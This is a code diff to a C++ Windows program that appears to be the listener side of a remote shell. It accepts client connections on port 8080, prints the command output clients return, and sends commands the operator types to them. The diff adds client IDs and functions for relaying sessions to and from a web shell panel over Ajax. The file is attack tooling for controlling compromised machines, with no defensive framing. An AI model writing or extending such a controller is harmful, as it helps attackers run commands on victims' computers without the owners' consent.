@@ -7,12 +7,15 @@
 #include <string>
 #include <thread>
 #include <mutex>
+#include <Windows.h>
 
 #pragma comment(lib, "ws2_32.lib")
 
 
 //------------------------------------------------------------------------------------------MUTEX -> mtx
 std::mutex mtx; // Mutex -> Sync Output 
+
+std::string xClientID = "XCLIENT00001";
 
 
 //------------------------------------------------------------------------------------------HANDLE CLIENT SHELL SESSION FUNCTION
@@ -31,7 +34,9 @@ void xHandleClient(SOCKET clientSocket) {
         std::string yCommand(yBuffer, yBytesRead); // Received Data -> Output
         {
             std::lock_guard<std::mutex> lock(mtx);
-            std::cout << "Received Output: " << yCommand;
+            std::cout << std::endl << "Received Output: " << yCommand << std::endl;
+
+            //xSendAjaxRequest(xClientID, yCommand); // Received Output -> Ajax -> Webshell
         }
     }
 }
@@ -44,12 +49,20 @@ void xInputThread(SOCKET clientSocket) {
         std::cout << "Enter a Command: ";
         std::getline(std::cin, yUserInput);
 
+        yUserInput += ' '; // Add Space
+
         send(clientSocket, yUserInput.c_str(), yUserInput.length(), 0); // Send -> Client
 
-        if (yUserInput == "exit") {
+        if (yUserInput == "exit ") {
             break; // exit -> End Input Loop
         }
     }
+}
+
+
+//------------------------------------------------------------------------------------------AJAX INPUT FUNCTION
+void xAjaxInput(SOCKET clientSocket, const std::string& command) {
+    send(clientSocket, command.c_str(), command.length(), 0); // Command -> Client
 }
 
 
@@ -111,6 +124,7 @@ void xStartListener(int yPort) {
 
 //------------------------------------------------------------------------------------------MAIN FUNCTION
 int main() {
+    SetConsoleOutputCP(CP_UTF8);
     xStartListener(8080); // Call -> xStartListener Function
     return 0;
 }
